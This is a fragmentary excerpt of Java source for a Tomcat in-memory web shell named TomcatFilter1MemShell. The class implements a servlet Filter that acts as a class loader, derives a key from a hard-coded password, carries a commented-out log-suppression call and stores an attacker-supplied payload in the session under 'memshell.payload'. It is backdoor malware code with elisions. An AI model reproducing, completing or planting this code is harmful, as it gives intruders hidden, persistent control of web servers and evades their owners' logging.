...
public class TomcatFilter1MemShell extends ClassLoader implements Filter {
    ...
    public TomcatFilter1MemShell() {
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }

    public TomcatFilter1MemShell(ClassLoader z) {
        super(z);
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }
...
//                this.noLog(request);
                ...
                if (session.getAttribute("memshell.payload") == null) {
                    session.setAttribute("memshell.payload", (new TomcatFilter1MemShell(this.getClass().getClassLoader())).Q(data));
                } else {
